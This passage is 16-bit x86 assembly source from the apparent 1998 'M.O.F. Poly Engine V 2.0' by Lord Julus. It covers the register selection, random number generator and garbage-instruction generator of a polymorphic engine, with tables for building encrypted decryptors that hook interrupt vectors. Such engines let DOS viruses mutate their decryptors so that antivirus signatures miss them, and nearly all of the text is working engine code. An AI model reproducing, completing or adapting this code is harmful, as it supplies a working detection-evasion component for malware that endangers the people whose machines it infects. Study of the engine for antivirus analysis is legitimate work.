        Lea bp, reg_order                 ;
        Xor ax, ax                        ;
        Mov cx, 6                         ;
                                          ;
Choose_loop:                              ; I don't remeber what this does
        Lea si, Register_opcode           ; ;-)))))
        Mov al, Byte Ptr [bp]             ;
        Add si, ax                        ;
        Sub si, 1                         ;
        Inc bp                            ;
        Lodsb                             ;
        Stosb                             ;
        Loop Choose_loop                  ;
                                          ; this area really needs some
        Mov al, Byte Ptr jreg1            ; optimizations...
        Shr al, 3                         ;
        Mov Byte Ptr j_reg1, al           ;
        Mov al, Byte Ptr jreg2            ;
        Shr al, 3                         ;
        Mov Byte Ptr j_reg2, al           ;
        mov ax, 10                        ;
        call random                       ;
        add ax, 4                         ;
        lea di, int_pl                    ;
        inc di                            ;
        stosb                             ;
        mov cx, 4                         ;
        mul cx                            ;
        lea di, iofs_1                    ;
        add di, 3                         ;
        stosw                             ;
        lea di, iofs_2                    ;
        add di, 3                         ;
        stosw                             ;
        add ax, 2                         ;
        lea di, iseg_1                    ;
        add di, 3                         ;
        stosw                             ;
        lea di, iseg_2                    ;
        add di, 3                         ;
        stosw                             ;
        Pop si di                         ;
        Popa                              ;
        Retn                              ;
Choose_registers Endp                     ;

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;±±                                                                         ±±
;±±  The General Random Number Generator for the poly engine.               ±±
;±±                                                                         ±±
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±

Randomize Proc Near                       ; random nr. generator initializer
       Push cx dx                         ; save them
       Xor ah,ah                          ; ah = 0
       Int 1Ah                            ; get date/time
       Mov [rand_seed], dx                ; and save it in the seed
       Xchg ch,cl                         ; make some calculations
       Add [rand_seed_2], cx              ; and generate the second seed
       Pop dx cx                          ; and now pop these
       Ret                                ; and go away
Randomize Endp                            ;
                                          ;
Random Proc Near                          ; The Random Number Generator
       Push cx                            ;
       Push ax                            ;
       In al,40h                          ; get a random
       Sub ax, [rand_seed]                ; substract it from seed 1
       Db 35h                             ; Xor Ax by seed 2
rand_seed_2 Dw 0                          ;
       Inc ax                             ; increment ax
       Add [rand_seed], ax                ; and create new random seed
       Pop cx                             ; and put the number into the
       Call Modulo                        ; boundaries
       Pop cx                             ;
       Ret                                ; and return
Random Endp                               ;
                                          ;
Modulo Proc Near                          ; this routine returns Ax modulo Cx.
       Push dx                            ; It's used to put AX between 0 and
       Xor dx, dx                         ; CX. DX is preserved.
       Div cx                             ;
       Xchg ax, dx                        ;
       Pop dx                             ;
       Ret                                ;
Modulo Endp                               ;

;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
;±±                                                                         ±±
;±±  The Garbage Generator (C) 1998 Lord Julus ;-)                          ±±
;±±                                                                         ±±
;±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±


Garbage_generator Proc Near               ;
       Push ax bx cx dx bp si             ; save registers but DI
       Mov ax, 25h                        ; we're gonna have about 25h
       Call Random                        ; groups
                                          ;
       Mov Word Ptr junk_start, di        ; save the nr. of junk instr.
                                          ;
Junk_loop:                                ; here's the main junk loop
       Mov ax, 50h                        ; get ax between 0-49h
       Call Random                        ;
       Cmp ax, 11h                        ; if ax in <= 10h then we'll
       Jnb No_jump                        ; generate a conditional jump
                                          ;
Create_jump:                              ; Here we create a conditional jump
       Mov ax, 11h                        ; choose a random jump out of
       Call Random                        ; 11h possible
       Lea si, Jump_opcodes               ; SI points to jumps' opcodes
       Add si, ax                         ; aligned with AX
       Lodsb                              ; take the byte
       Stosb                              ; and put it.
       Mov Word Ptr jump_place, di        ; and save the jump place
       Mov al, 0                          ; and store the address 0
       Stosb                              ;
       Mov ax, 2h                         ; now we will create a number of
       Call Random                        ; junk instructions between 2 and
       Add ax, 2h                         ; 4.
       Call Gen_ax_junks                  ;
       Mov bx, di                         ; BX = where the jump will jump
       Mov cx, Word Ptr jump_place        ; CX = the place to put the jump
       Mov bp, cx                         ; BP = CX
       Inc cx                             ; increment to align
       Sub bx, cx                         ; find out the difference
       Mov Byte Ptr [bp], bl              ; and store it in the right place
       Jmp Done_with_this                 ; and finish.
                                          ;
No_jump:                                  ;
       Mov ax, 50h                        ; if no jump is created, maybe we
       Call Random                        ; can create a fake call to a
       Cmp ax, 11h                        ; fake routine
       Jnb No_call                        ;
                                          ;
Create_call:                              ;
       Mov Byte Ptr in_call, 1            ;
       Mov ax, 21h                        ; This is where we create the CALL
       Call Random                        ;
       Cmp ax, 11h                        ;
       Jb Type_2_call                     ; we choose from 2 types of CALL
                                          ;
Type_1_call:                              ; This is Type 1
       Mov al, 0E9h                       ; First store a JMP NEAR
       Stosb                              ;
       Mov Word Ptr over_junk_ref, di     ; and save it's place
       Mov ax, 0                          ;
       Stosw                              ;
       Mov ax, 2h                         ; now again we create a random
       Call Random                        ; number of junk instructions
       Add ax, 2h                         ;
       Call Gen_ax_junks                  ;
       Mov al, 0C3h                       ; then we store a RET
       Stosb                              ;
       Mov bx, di                         ; now we must compute the JMP
       Mov cx, Word Ptr over_junk_ref     ; address
       Mov bp, cx                         ; BP = where to put it
       Inc cx                             ;
       Inc cx                             ;
       Sub bx, cx                         ; BX = correct JMP length
       Mov Word Ptr [bp], bx              ; store it
       Mov ax, 2                          ;
       Call Random                        ;
       Add ax, 2                          ;
       Call Gen_ax_junks                  ;
       Mov al, 0E8h                       ; Now store the CALL
       Stosb                              ;
       Mov bx, di                         ; and compute the CALL length
       Mov cx, Word Ptr over_junk_ref     ; The Call will jump right after
       Mov bp, cx                         ; the JMP and before the RET.
       Mov Word Ptr last_call, bp         ;
       Sub cx, bx                         ;
       Mov ax, cx                         ;
       Stosw                              ;
       Mov ax, 2h                         ;
       Call Random                        ;
       Add ax, 2h                         ;
       Call Gen_ax_junks                  ;
       Jmp Call_over                      ;
                                          ;
Type_2_call:                              ; This is Type 2
       Mov ax, 2h                         ; first some junks
       Call Random                        ;
       Add ax, 2h                         ;
       Call Gen_ax_junks                  ;
       Mov al, 0E8h                       ; Then the Call
       Stosb                              ;
       Mov Word Ptr call_ref, di          ; save it's refference
       Mov ax, 0                          ;
       Stosw                              ;
       Mov ax, 2h                         ; junks again
       Call Random                        ;
       Add ax, 2h                         ;
       Call Gen_ax_junks                  ;
       Mov al, 0E9h                       ; Store a JMP NEAR
       Stosb                              ;
       Mov Word Ptr over_junk_ref, di     ; save it's refference too
       Mov Word Ptr last_call, di         ;
       Mov ax, 0                          ;
       Stosw                              ;
       Mov bx, di                         ; now we are about to compute the
       Mov cx, Word Ptr call_ref          ; Calls length
       Mov bp, cx                         ;
       Sub cx, 2                          ;
       Sub bx, cx                         ;
       Sub bx, 4                          ;
       Mov Word Ptr [bp], bx              ; and store it in the right place
       Mov ax, 2h                         ;
       Call Random                        ;
       Add ax, 2h                         ;
       Call Gen_ax_junks                  ;
       Mov al, 0C3h                       ; store the RET
       Stosb                              ;
       Mov bx, di                         ;
       Mov cx, Word Ptr over_junk_ref     ; and compute the JMP's length
       Mov bp, cx                         ;
       Add cx, 2                          ;
       Sub bx, cx                         ;
       Mov Word Ptr [bp], bx              ;
       Mov ax, 2h                         ;
       Call Random                        ;
       Add ax, 2h                         ;
       Call Gen_ax_junks                  ;
       Jmp Call_over                      ;
                                          ;
No_call:                                  ;
       Mov ax, 45h                        ; Maybe we'll create an INT
       Call Random                        ;
       Cmp ax, 7h                         ;
       Jnb No_int                         ;
                                          ;
Create_int:                               ;
       Mov al, 60h                        ; Store a PUSHA
       Stosb                              ;
       Mov Byte Ptr allowence, 1          ;
       Mov ax, 4                          ; generate some random junk
       Call Random                        ;
       Inc ax                             ;
       Call Gen_ax_junks                  ;
       Mov al, 0B4h                       ; Store MOV AH, ...
       Stosb                              ;
       Mov ax, Word Ptr int_nr            ; Choose a random INT with a
       Call Random                        ; random service
       Shl ax, 1                          ;
       Lea si, Int_opcodes                ;
       Add si, ax                         ;
       Lodsb                              ;
       Stosb                              ;
       Mov al, 0CDh                       ; Store an INT xxH
       Stosb                              ;
       Lodsb                              ;
       Stosb                              ;
       Mov ax, 4                          ; some junk...
       Call Random                        ;
       Inc ax                             ;
       Call Gen_ax_junks                  ;
       Mov al, 61h                        ; Store a popa
       Stosb                              ;
       Mov Byte Ptr allowence, 0          ;
       Jmp Done_with_this                 ;
                                          ;
No_int:                                   ;
       Mov ax, 1                          ; If we don't create anything above
       Call Gen_ax_junks                  ; generate 1 junk instruction
                                          ;
Call_over:                                ;
       Mov Byte Ptr in_call, 0            ;
Done_with_this:                           ;
       Mov ax, di                         ;
       Sub ax, Word Ptr [junk_start]      ;
       Cmp ax, 14h                        ;
       Jna Junk_loop                      ;
                                          ;
       Pop si bp dx cx bx ax              ; and restore registers
       Ret                                ; return from the Garbage Generator
                                          ;
                                          ;
Choose_junk_reg Proc Near                 ;
       Cmp Byte Ptr allowence, 0          ;
       Je Only_jreg                       ;
                                          ;
Rep_rnd:                                  ;
       Mov ax, 8                          ;
       Call Random                        ;
       Cmp ax, 4                          ;
       Je Rep_rnd                         ;
       Jmp Ok_jreg                        ;
                                          ;
Only_jreg:                                ;
       Mov ax, 2                          ;
       Call Random                        ;
       Lea bp, j_reg1                     ; We have 2 junk registers. This
       Add bp, ax                         ; procedure randomly chooses one
       Mov al, Byte Ptr [bp]              ; of them and leaves it in the
Ok_jreg:                                  ;
       Mov Byte Ptr reg1, al              ;
       Ret                                ; AL register
Choose_junk_reg Endp                      ;
                                          ;
                                          ;
Gen_ax_junks Proc Near                    ; This procedure generates AX junk
       Push cx                            ; instructions.
       Xchg ax, cx                        ; We move ax in the CX counter
       Mov Byte Ptr modify, 0FFh          ; mark this with FFh. FFh means
                                          ; that this won't be used.
Repeat:                                   ; the main loop
       Push cx                            ; save counter
       Push di                            ; and current offset
                                          ;
       Cmp Byte Ptr in_call, 1            ; Check if we are in the middle of
       Je Can_t_do_call                   ; a call creation (if so, we cannot
       Cmp Word Ptr last_call, 0          ; make a back-call. Also have to
       Je Can_t_do_call                   ; check if we already made a
       Cmp Byte Ptr call_allow, 4         ; routine, and if from the last
       Jb Can_t_do_call                   ; back-call we made other at least
       Mov ax, 20h                        ; 4 instructions.
       Call Random                        ; If all conditions are OK we set
       Cmp ax, 7                          ; a probability for a back-call
       Jnb Can_t_do_call                  ;
       Pop di                             ;
       Mov al, 0E8h                       ; encode a CALL near
       Stosb                              ;
       Mov ax, di                         ;
       Mov cx, Word Ptr last_call         ; compute the call's length
       Sub ax, cx                         ;
       Neg ax                             ;
       Stosw                              ; and store it
       Mov call_allow, 0                  ; reset allowence for the calls
       Jmp You_stink                      ; and go away >;-)
                                          ;
Can_t_do_call:                            ;
       Inc Byte Ptr call_allow            ;
       Mov Byte Ptr word_or_byte, 1       ; this marks the instr. type, e.g.
                                          ; Word Ptr or Byte Ptr. Word is
       Cmp Byte Ptr j_reg1, 3             ; default. But we can only use the
       Ja No_byte_style                   ; byte mode if the junk registers
       Cmp Byte Ptr j_reg2, 3             ; are not SI or DI !
       Ja No_byte_style                   ;
                                          ;
       Mov ax, 2                          ; if we can, we choose a random
       Call Random                        ; type: word or byte
       Mov Byte Ptr word_or_byte, al      ;
                                          ;
No_byte_style:                            ;
       Mov ax, 5                          ; We have 5 junk instruction tables
       Call Random                        ; For each of them we have to set
       Cmp ax, 0                          ; some parameters.
       Jne Not_table_0                    ;
       Call Choose_junk_reg               ;
       Mov ax, 7                          ; then we will choose a random mod
       Call Random                        ; (out of 7), e.g. DI+, SI+, etc.
       Mov Byte Ptr modify, al            ; which we also save.
       Xor ax, ax                         ; restore ax
       Jmp Go_on                          ;
                                          ;
Not_table_0:                              ;
       Cmp ax, 1                          ; For Table 1 we must choose 2
       Jne Not_table_1                    ; registers. The first (destination)
       Push ax
       Mov Byte Ptr modify, 0AAh          ; is a junk register. The second
       Call Choose_junk_reg               ;
       Shl al, 3                          ; Also, the first register must be
       Mov Byte Ptr reg1, al              ; aligned like this 00reg000
       Mov ax, 8                          ;
       Call Random                        ;
       Mov Byte Ptr reg2, al              ;
       Pop ax
       Jmp Go_on                          ;
                                          ;
Not_table_1:                              ;
       Cmp ax, 2                          ; For Table 2 we only have to
       Jne Not_table_2                    ; choose a random junk register.
       Push ax                            ;
       Mov Byte Ptr modify, 0BBh          ;
       Call Choose_junk_reg               ;
       Pop ax                             ;
       Jmp Go_on                          ;
                                          ;
Not_table_2:                              ;
       Cmp ax, 4                          ; For Table 4 we have the shifting
       Jne Not_table_4                    ; instructions
       Push ax                            ;
       Mov Byte Ptr modify, 0CCh          ;
       Call Choose_junk_reg               ;
       Pop ax                             ;
       Jmp Go_on                          ;
                                          ;
Not_table_4:                              ;
Go_on:                                    ; Here we finally gen. the instr.
       Mov bx, Offset Garbage_tables_ofs  ; BX points to the offsets. AX holds
       Shl ax, 1                          ; the table number. Multiply it by
       Add bx, ax                         ; 2 (cause ofs is word) and add it
       Mov si, [bx]                       ; to BX and then take the off. in SI
       Add si, Offset Garbage_table       ; and align it with the beginning.
       Lea di, garbage_tables_opl         ; DI points to the table with the
       Add di, ax                         ; opcodes' length in bytes.
       Mov cx, [di]                       ; CX will hold the opcode length
       Lea di, garbage_tables_nri         ; DI points to the table with the
       Add di, ax                         ; number of instr. in each table
       Mov ax, [di]                       ; AX = num. of instr.
       Call Random                        ; choose a random one
       Push ax                            ; save AX
       Push cx                            ; and CX
       Xchg ax, cx                        ; exchange them in order to multiply
       Mul cx                             ; AX by CX
       Xchg ax, cx                        ; then back again
       Pop ax                             ; AX = original CX
       Add si, cx                         ; CX holds the proper alignement
       Pop cx                             ; CX = AX
       Xchg ax, cx                        ; put them back
       Pop di                             ; restore DI
                                          ;
Loop1:                                    ; this is the loop
       Lodsb                              ; take a byte from the opcode
       Stosb                              ; and store it
                                          ;
       Cmp Byte Ptr modify, 0CCh          ; Do we have shift instructions ?
       Jne Not_shift                      ;
       Cmp cx, 1                          ;
       Jne No_operation                   ;
       Lea bp, Shift_opcodes              ;
       Mov ax, 3                          ;
       Call Random                        ;
       Add bp, ax                         ;
       Mov dl, Byte Ptr [bp]              ;
       Mov Byte Ptr [di-2], dl            ;
       And Byte Ptr [di-1], 11111000b     ; clear reg field
       Mov dl, Byte Ptr reg1              ; get the reg1
       Or Byte Ptr [di-1], dl             ; and store it
       Cmp ax, 1                          ;
       Jne Not_imm_shift                  ;
       Mov ax, 0F0h                       ;
       Call Random                        ;
       Stosb                              ;
Not_imm_shift:                            ;
       Jmp No_operation                   ;
                                          ;
Not_shift:                                ;
       Cmp Byte Ptr modify, 0BBh          ; Do we have a imm to reg instr ?
       Jne Not_reg2imm                    ;
       Cmp cx, 1                          ;
       Jne No_operation                   ;
       Mov al, Byte Ptr reg1              ; if so, take the register into AX
       And Byte Ptr [di-3], 11111000b     ; clear it's way
       Or Byte Ptr [di-3], al             ; and store it there
       Mov ax, 0FFFEh                     ; now generate a random data
       Call Random                        ; for the reg, imm
       Mov Word Ptr [di-2], ax            ; and store it
       And Byte Ptr [di-4], 11111110b     ; now clear the word/byte bit
       Mov al, Byte Ptr word_or_byte      ; and put it there
       Or Byte Ptr [di-4], al             ;
       Cmp Byte Ptr word_or_byte, 0       ; being a imm to reg instr, if
       Jne Word_style                     ; it's byte style, we only need
       Dec di                             ; one byte so we take DI back 1.
                                          ;
Word_style:                               ;
       Jmp No_operation                   ;
                                          ;
Not_reg2imm:                              ;
       Cmp Byte Ptr modify, 0AAh          ; If it's reg to reg, then
       Jne Not_reg2reg                    ; here we clear the way for the
       Cmp cx, 1                          ; 2 registers and for the byte/word
       Jne No_operation                   ; bit, and simply put them there
       And Byte Ptr [di-1], 11000000b     ;
       Mov al, Byte Ptr reg1              ;
       Or Byte Ptr [di-1], al             ;
       Mov al, Byte Ptr reg2              ;
       Or Byte Ptr [di-1], al             ;
       And Byte Ptr [di-2], 11111110b     ;
       Mov al, Byte Ptr word_or_byte      ;
       Or Byte Ptr [di-2], al             ;
       Jmp No_operation                   ;
                                          ;
Not_reg2reg:                              ;
       Cmp Byte Ptr modify, 0FFh          ; This is mem to reg
       Je Not_reg2mem                     ;
       Cmp cx, 1                          ;
       Jne No_operation                   ;
       Mov dl, Byte Ptr modify            ; restore the mod and fill it
       And Byte Ptr [di-3], 11111000b     ; where it belongs
       Or Byte Ptr [di-3], dl             ;
       And Byte Ptr [di-3], 11000111b     ;
       Mov al, Byte Ptr reg1              ; take the reg
       Shl al, 3                          ; and align it like this 00reg000
       Or Byte Ptr [di-3], al             ;
       Mov ax, 0FFFEh                     ; now get a random data for
       Call Random                        ; reg, [reg+data]
       Mov Word Ptr [di-2], ax            ;
       And Byte Ptr [di-4], 11111110b     ; and store the word/byte bit too
       Mov al, Byte Ptr word_or_byte      ;
       Or Byte Ptr [di-4], al             ;
       Cmp al, 1                          ; is it word style ?
       Jne No_case                        ;
       And Byte Ptr [di-3], 00111111b     ; clear the r/m field
       And Byte Ptr [di-3], 11111000b     ;
       Or Byte Ptr  [di-3], 00000110b     ;
No_case:                                  ;
                                          ;
                                          ;
Not_reg2mem:                              ;
No_operation:                             ;
       Loop Loop1                         ;
                                          ;
You_stink:                                ;
       Mov Byte Ptr modify, 0FFh          ; reset the value here to unused
       Pop cx                             ; restore counter
       Loop Repeat                        ; and loop !
                                          ;
       Pop cx                             ; restore main counter
       Ret                                ; and return
Gen_ax_junks Endp                         ;
                                          ;
Garbage_table:                            ; The Garbage tables
Table_0:                                  ; Table 0 is the one with the
        Mov cx, Word Ptr [bx+si+1000h]    ; MEM to REG instructions
        Add cx, Word Ptr [bx+si+1000h]    ;
        Sub cx, Word Ptr [bx+si+1000h]    ;
        Xor cx, Word Ptr [bx+si+1000h]    ;
        Or  cx, Word Ptr [bx+si+1000h]    ;
        And cx, Word Ptr [bx+si+1000h]    ;
        Adc cx, Word Ptr [bx+si+1000h]    ;
        Sbb cx, Word Ptr [bx+si+1000h]    ;
table_0_len Equ $ - Table_0               ; Table 0 length
                                          ;
Table_1:                                  ;
        Mov cx, cx                        ; Table 1 is the one with REG to
        Add cx, cx                        ; REG instructions
        Sub cx, cx                        ;
        Xor cx, cx                        ;
        Or  cx, cx                        ;
        And cx, cx                        ;
        Adc cx, cx                        ;
        Sbb cx, cx                        ;
        Test cx, cx                       ;
table_1_len Equ $ - Table_1               ; Table 1 length
                                          ;
Table_2:                                  ;
        Add cx, 1000h                     ; Table 2 is the one with IMM to
        Sub cx, 1000h                     ; REG
        Xor cx, 1000h                     ;
        Or  cx, 1000h                     ;
        And cx, 1000h                     ;
        Adc cx, 1000h                     ;
        Sbb cx, 1000h                     ;
        Test cx, 1000h                    ;
table_2_len Equ $ - Table_2               ; Table 2 length
                                          ;
Table_3:                                  ;
        Stc                               ; The one byte junk instructions
        Clc                               ;
        Std                               ;
        Cld                               ;
        Cmc                               ;
        Sahf                              ;
        Nop                               ;
        Int 03                            ;
        Wait                              ;
table_3_len Equ $ - Table_3               ; Table 3 length
                                          ;
Table_4:                                  ; Table 4
        Shr cx, cl                        ;
        Shl cx, cl                        ;
        Sar cx, cl                        ;
        Ror cx, cl                        ;
        Rol cx, cl                        ;
        Rcr cx, cl                        ;
        Rcl cx, cl                        ;
table_4_len Equ $ - Table_4               ;
                                          ;
                                          ;
Garbage_table_end:                        ;
                                          ;
Garbage_tables_ofs:                       ;
   Dw 0                                   ; The offset displacements for each
   Dw table_0_len                         ; table, relative to Table 0
   Dw table_0_len+table_1_len             ;
   Dw table_0_len+table_1_len+table_2_len ;
   Dw table_0_len+table_1_len+table_2_len+table_3_len

garbage_tables_opl Dw 4, 2, 4, 1, 2       ; The length of the opcodes in each
                                          ; Table
garbage_tables_nri Dw 8, 9, 8, 9, 7       ; The number of instructions in each
                                          ; Table
Shift_opcodes:                            ;
      Db 0D1h                             ; <op> reg, 1
      Db 0C1h                             ; <op> reg, imm
      Db 0D3h                             ; <op> reg, cl
                                          ;
Jump_opcodes:                             ; The conditional jumps' opcodes
      Db 76h                              ;  jbe/jna
      Db 7Eh                              ;  jle/jng
      Db 72h                              ;  jb/jnae/jc
      Db 7Ch                              ;  jl/jnge
      Db 74h                              ;  jz/je
      Db 75h                              ;  jne/jnz
      Db 73h                              ;  jae/jnb/jnc
      Db 7Dh                              ;  jge/jnl
      Db 77h                              ;  ja/jnbe
      Db 7Fh                              ;  jg/jnle
      Db 0E3h                             ;  jcxz
      Db 71h                              ;  jno
      Db 70h                              ;  jo
      Db 7Ah                              ;  jp/jpe
      Db 7Bh                              ;  jnp/jpo
      Db 79h                              ;  jns
      Db 78h                              ;  js
                                          ;
Int_opcodes:                              ;
      Db 0Bh, 21h                         ; get keyboard status
      Db 19h, 21h                         ;
      Db 30h, 21h                         ; get Dos version
      Db 4Dh, 21h                         ;
      Db 03h, 10h                         ;
      Db 04h, 10h                         ;
      Db 04h, 10h                         ;
      Db 08h, 10h                         ;
      Db 0Fh, 10h                         ;
                                          ;
int_nr Equ 09h                            ; Number of Ints to generate from
                                          ;
jump_place    Dw 0                        ; The address of the jump
over_junk_ref Dw 0                        ; Where we JMP in a fake CALL
call_ref      Dw 0                        ; The Call refference
modify        Db 0                        ; modify byte
j_reg1        Db 2                        ; junk register no. 1
j_reg2        Db 3                        ; junk register no. 2
reg1          Db 0                        ; the first register in junks
reg2          Db 0                        ; the second...
word_or_byte  Db 0                        ;
                                          ;
Garbage_generator Endp                    ;
                                          ;
                                          ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; DATA AREA
;
; First I have the instructions I use in my decryptors, but with the
; 'mod' and 'reg' fields cleared, so I can OR them with my reg and mod fields
; with no problems. After each instruction I have a 0FFH which marks
; it's end so the procedure Go_To_Instruction can locate any instruction very
; fast. Each 0feh marks a byte that holds signifiant fields that need to be
; filled.

Instr_table:
             Db 055h, 0FFh                      ; push bp               (01)
             Db 8Bh, 0ECh, 0FFh                 ; mov bp, sp            (02)
             Db 8Bh, 46h, 0FEh, 08h, 0FFh       ; mov creg, [bp+08]     (03)
             Db 033h, 0C0h, 0FEh, 0FFh          ; <math> reg, reg       (04)
             Db 89h, 0, 0FEh, 0FFh              ; mov [preg], creg      (05)
             Db 040h, 0FEh, 0FFh                ; inc reg               (06)
             Db 05Dh, 0FFh                      ; pop bp                (07)
             Db 83h, 0C4h, 08h, 0FFh            ; add sp, 8             (08)
             Db 048h, 0FEh, 0FFh                ; dec reg               (09)
             Db 075h, 03h, 0E9h, 0, 0, 0FFh     ; jnz ____ / jmp ____   (0A)
             Db 0E9h, 0, 0, 0FFh                ; jmp ____              (0B)
             Db 0CFh, 0FFh                      ; iret                  (0C)
             Db 060h, 0FFh                      ; pusha                 (0D)
             Db 050h, 0FEh, 0FFh                ; push reg              (0E)
             Db 0FAh, 0FFh                      ; cli                   (0F)
             Db 8Eh, 0D8h, 0FEh, 0FFh           ; mov sreg, reg         (10)
iofs_1:      Db 8Bh, 06h, 0FEh, 18h, 0, 0FFh    ; mov reg, [Iofs]       (11)
             Db 2Eh, 89h, 86h, 0FEh, 0, 0, 0FFh ; mov cs:[bp+____], reg (12)
iseg_1:      Db 8Bh, 06h, 0FEh, 1Ah, 0, 0FFh    ; mov reg, [Iseg]       (13)
             Db 2Eh, 89h, 86h, 0FEh, 0, 0, 0FFh ; mov cs:[bp+____], reg (14)
             Db 8Dh, 86h, 0FEh, 0, 0, 0FFh      ; lea reg, [bp+____]    (15)
iofs_2:      Db 89h, 06h, 0FEh, 18h, 0, 0FFh    ; mov [Iofs], reg       (16)
             Db 8Ch, 0C8h, 0FEh, 0FFh           ; mov reg, cs           (17)
iseg_2:      Db 89h, 06h, 0FEh, 1Ah, 0, 0FFh    ; mov [Iseg], reg       (18)
             Db 0FBh, 0FFh                      ; sti                   (19)
             Db 01Fh, 0FFh                      ; pop ds                (1A)
             Db 0B8h, 0FEh, 0h, 0h, 0FFh        ; mov reg, ____         (1B)
             Db 8Bh, 0, 0FEh, 0FFh              ; mov reg, [reg]        (1C)
int_pl:      Db 0CDh, 06h, 0FFh                 ; int xxh               (1D)
             Db 061h, 0FFh                      ; popa                  (1E)
             Db 0C3h, 0FFh                      ; ret                   (1F)
             Db 01Eh, 0FFh                      ; push ds               (20)
             Db 0Eh, 0FFh                       ; push cs               (21)
             Db 2Eh, 8Bh, 86h, 0FEh, 0, 0, 0FFh ; mov reg, cs:[bp+____] (22)
             Db 90h, 90h, 0FFh                  ; offset for INT xx     (23)
             Db 90h, 90h, 0FFh, 0FEh            ; segment for INT xx    (24)
End_instr_table:

; The next is a table that loox like this:
;
;       XXXYYYZZ, where we have the following meanings:
;
;       XXX = 111 - leave instruction as it is
;             110 - fill only the 'mod' field
;             101 - fill only the 'reg' field
;             011 - fill both 'reg' and 'mod'
;             100 - a reg to reg instruction
;
;       YYY = 000 - use creg
;             001 - use lreg
;             010 - use kreg
;             011 - use preg
;             100 - use jreg1
;             101 - use jreg2
;
;       ZZ  = x0  - no data refference          --- a pointer reffers to it
;             x1  - holds data refference       _|
;             0x  - no refference from data     --- holds a pointer
;             1x  - holds refference from data  _|

Used_stuff_table:
              Db 0E0h,  0E0h,  0A0h,  080h,  060h,  0A8h,  0B4h
              Db 0B4h,  0E0h,  0E0h,  0A4h,  0E1h,  0E1h,  0E0h
              Db 0E0h,  0E0h,  0E0h,  080h,  0A4h,  0A4h,  0A5h
              Db 0A4h,  0A5h,  0A5h,  0A4h,  0A4h,  0A4h,  0E0h
              Db 0E0h,  0E0h,  0B5h,  0A4h,  0A9h,  062h,  0A0h
              Db 0E0h,  082h,  0A0h,  0E0h,  0A1h,  0A0h,  0A1h
              Db 0A0h,  0E0h,  0E0h,  0E0h,  0E0h,  0E0h,  0E0h

; The secondary table is a crap I was forced to use because of the stupid
; way Intel's instructions are made. So it actually marks the correct
; position for the reg field withing the rm/mod byte. I will find soon a
; way to remove it... it sux !

Secondary_table:
              Db 000h,  000h,  000h,  002h,  000h,  003h,  003h
              Db 003h,  000h,  000h,  003h,  000h,  000h,  000h
              Db 000h,  000h,  000h,  009h,  003h,  000h,  000h
              Db 000h,  000h,  000h,  000h,  003h,  000h,  000h
              Db 000h,  000h,  000h,  003h,  003h,  000h,  003h
              Db 000h,  000h,  003h,  000h,  000h,  000h,  000h
              Db 000h,  000h,  000h,  000h,  000h,  000h,  000h

; Here we have the decryptors, e.g. sets of instructions from the above
; table ordered in a certain order. These values are passed to the
; Go_To_Instruction procedure which finds the proper instrucion to store.

Decryptors_table:
   Db 01h, 02h, 03h, 04h, 05h, 06h, 06h, 06h, 07h, 08h, 09h, 0Ah, 0Bh, 0Ch
   Db 0Dh, 20h, 0Fh, 04h, 10h, 11h, 12h, 13h, 14h, 15h, 16h, 17h, 18h, 19h
   Db 21h, 1Ah, 15h, 1Bh, 1Bh, 1Ch, 0Eh, 1Dh, 04h, 10h, 0Fh, 22h, 16h, 22h
   Db 18h, 19h, 1Ah, 1Eh, 1Fh, 23h, 24h, 24h

decryptor_len Equ $ - Decryptors_table  ; this is the length of decryptor

Register_opcode:             ; Here we have the opcodes for the reg field
       Db  00h               ; AX   (aligned like this: 00reg000)
       Db  08h               ; CX
       Db  10h               ; DX
       Db  30h               ; SI
       Db  38h               ; DI
       Db  18h               ; BX
                             ;
Mod_opcode:                  ; and here the opcodes for the mod field
       Db 04h                ; [SI]   (aligned like this: 00000mod)
       Db 05h                ; [DI]
       Db 07h                ; [BX]
                             ;
Method_op:                   ; Here we have the encryption methods' opcodes
       Db 33h                ; XOR / XOR
       Db 2Bh                ; ADD / SUB
       Db 03h                ; SUB / ADD
                             ;
; Specific data              ;
                             ;
Used_registers:              ;
creg  Db 0                   ; Register to hold the code
lreg  Db 0                   ; Register to hold the length of code
kreg  Db 0                   ; Register to hold the encryption key
jreg1 Db 0                   ; Junk register #1
jreg2 Db 0                   ; Junk register #2
prg   Db 0                   ; the pointer register
                             ;
rand_seed Dw 0               ; Random seed
counter   Dw 0               ; counter... duh !!
                             ;
Used_pointers:               ;
preg  Db 0                   ; Register to hold the pointer register
jprg1 Db 0                   ; Junk pointer register
jprg2 Db 0                   ;
                             ;
reg_order Db 1,2,3,4,5,6     ; here we store the order of the registers
                             ;
instr_number   Equ 50d       ; how many instructions in the decryptor
key            Dw 0          ; encryption key
code_len       Dw 0          ; code length
code_start     Dw 0          ; pointer to code start
method         Dw 0          ; the method of the poly engine
last_instr     Dw 0          ; last instruction's end
decr_entry     Dw 0          ;
buffer_address Dw 0          ;
last_call      Dw 0          ;
call_allow     Db 0          ;
allowence      Db 0          ;
in_call        Db 0          ;
misc           Db 0          ;
junk_start     Dw 0          ;

; Here we have a table with those instructions that have data within and
; the engine saves the data's offsets into the next table. Don't "have kids"
; with these addreses either ( ;-))) ) or it might not work... The values to
; put at those offsets can be found in the values table.

Data_instr_place:
       Db 0Dh, 0Eh, 16h, 18h, 19h, 20h, 21h, 22h, 29h, 2Bh, 00h, 00h

Pos_refference:
       Db 25h, 22h, 30h, 31h, 01h, 00h, 00h, 00h, 30h, 31h, 00h, 00h

Offsets:
       Dw 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0

Values:
       Dw 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0

Mof    Endp

;,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~``~˘.,.˘~`
; M.O.F. Poly Engine V 2.0 end - Length of the engine 2568 bytes
